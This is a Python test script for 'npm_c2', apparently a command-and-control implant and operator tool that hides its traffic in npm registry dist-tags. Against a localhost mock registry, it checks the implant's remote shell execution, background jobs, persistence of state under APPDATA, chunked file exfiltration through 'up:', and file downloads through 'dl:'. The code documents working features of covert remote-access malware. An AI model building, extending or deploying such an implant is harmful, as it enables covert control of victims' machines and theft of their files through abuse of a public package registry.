#!/usr/bin/env python3
"""Realistic operator/implant exercise: cwd, timeouts, bg jobs, up/down ranges.

Runs the real package code against the mock registry over HTTP.
"""
import os
import sys
import tempfile
import time

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))
sys.path.insert(0, os.path.dirname(__file__))

import npm_c2
import mock_registry
from npm_c2.implant import Implant, MAX_UPLOAD

FAILS = []


def step(name, ok, detail=""):
    print(f"[{'PASS' if ok else 'FAIL'}] {name}" + (f"  -> {detail}" if detail else ""))
    if not ok:
        FAILS.append(name)


def main():
    reg = mock_registry.Registry()
    srv, base = mock_registry.serve(reg, auth_token="npm_test")
    npm_c2.API = base + "/-/package/{}/dist-tags"
    import npm_c2.implant as im
    import npm_c2.operator as op_mod
    im.API = npm_c2.API
    op_mod.API = npm_c2.API

    from npm_c2.operator import Operator
    pkg = "ops/pkg"
    reg.tags.setdefault(pkg, {})["latest"] = "1.0.0"
    tmp = tempfile.mkdtemp()
    os.environ["APPDATA"] = tmp
    work = os.path.join(tmp, "work")
    os.makedirs(work)

    imp = Implant(pkg, token="npm_test", interval=10, jitter=0)
    imp.cwd = work
    op = Operator(pkg, "npm_test")

    # --- cwd persistence
    out = imp._exec("cd")
    step("cd prints the working directory", out == f"cwd={work}", out)

    os.makedirs(os.path.join(work, "sub"), exist_ok=True)
    imp._exec("cd:sub")
    step("cd: changes the directory", imp.cwd == os.path.join(work, "sub"), imp.cwd)

    imp._exec(f"cd:{work}")
    step("cd: back to an absolute path", imp.cwd == work, imp.cwd)

    bad = imp._exec("cd:/nonexistent/nope")
    step("cd: rejects a missing directory", bad.startswith("cd: no such"), bad)

    # --- cwd survives a restart through the state file
    imp._save()
    imp2 = Implant(pkg, token="npm_test")
    imp2._load()
    step("cwd persists across restarts", imp2.cwd == work,
         f"{imp2.cwd} vs {work}")

    # --- timeout prefix
    t0 = time.time()
    out = imp._exec("timeout:1:sleep 5")
    dt = time.time() - t0
    step("timeout: aborts a long command", "timeout after 1s" in out and dt < 4,
         f"{out!r} in {dt:.1f}s")

    # --- exit code is surfaced
    out = imp._exec("exit 7" if os.name != "nt" else "exit /b 7")
    step("non-zero exit is reported", out.startswith("[rc="), out[:40])

    # --- output truncation is labelled
    out = imp._exec("head -c 20000 /dev/zero | tr '\\0' 'A'")
    step("long output is truncated with a marker",
         "truncated" in out and len(out) <= 12050, f"{len(out)} chars")

    # --- background jobs
    started = imp._exec("bg:sh -c 'echo bg-line; sleep 2; echo done-line'")
    step("bg: starts a job", started.startswith("job j"), started)
    time.sleep(0.6)
    listing = imp._exec("jobs")
    step("jobs lists the running job", "j1 running" in listing or "j1 done" in listing, listing)
    time.sleep(2.2)
    outj = imp._exec("out:j1")
    step("out: returns the job's output",
         "bg-line" in outj and "done-line" in outj, outj.replace("\n", " | ")[:90])
    step("kill: rejects an unknown job", "unknown job" in imp._exec("kill:zzz"))

    # --- up: byte ranges
    big = os.path.join(work, "big.bin")
    with open(big, "wb") as f:
        f.write(bytes(range(256)) * 100)          # 25 600 bytes
    a = imp._exec(f"up:{big}:0:100")
    b = imp._exec(f"up:{big}:100:100")
    step("up: honours offset and length", a.startswith("up 0-100/25600b+") and
         b.startswith("up 100-200/25600b+"), f"{a[:24]} / {b[:24]}")
    step("up: the two slices differ", a.split(": ", 1)[1] != b.split(": ", 1)[1])

    whole = imp._exec(f"up:{big}")
    step("up: caps a single reply at MAX_UPLOAD",
         whole.startswith(f"up 0-{MAX_UPLOAD}/25600b+"), whole[:30])
    tail = imp._exec(f"up:{big}:25500:200")
    step("up: the last slice is not marked truncated",
         "b: " in tail and not tail.split(": ")[0].endswith("+"), tail[:30])

    # --- dl: relative destination resolves against cwd
    import http.server
    import threading

    class Quiet(http.server.BaseHTTPRequestHandler):
        protocol_version = "HTTP/1.1"

        def log_message(self, *a):
            pass

        def do_GET(self):
            body = b"DOWN"
            self.send_response(200)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

    srv2 = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Quiet)
    threading.Thread(target=srv2.serve_forever, daemon=True).start()
    url = f"http://127.0.0.1:{srv2.server_address[1]}/x.bin"
    out = imp._exec(f"dl:{url}:rel/dl.bin")
    expected = os.path.join(work, "rel", "dl.bin")
    step("dl: relative path lands in cwd",
         os.path.exists(expected) and open(expected, "rb").read() == b"DOWN",
         out)

    # --- interactive run_command end to end
    imp._cycle()                                   # drain anything queued
    threading.Thread(target=lambda: [imp._cycle() or time.sleep(0.2) for _ in range(6)],
                     daemon=True).start()
    res = op.run_command("echo interactive-ok", timeout=12, interval=0.4, quiet=True)
    step("operator.run_command waits for output",
         res is not None and "interactive-ok" in res, repr(res)[:60])

    srv2.shutdown()
    srv.shutdown()
    print(f"\n{'all ops steps passed' if not FAILS else 'failing: ' + ', '.join(FAILS)}")
    return 1 if FAILS else 0


if __name__ == "__main__":
    sys.exit(main())
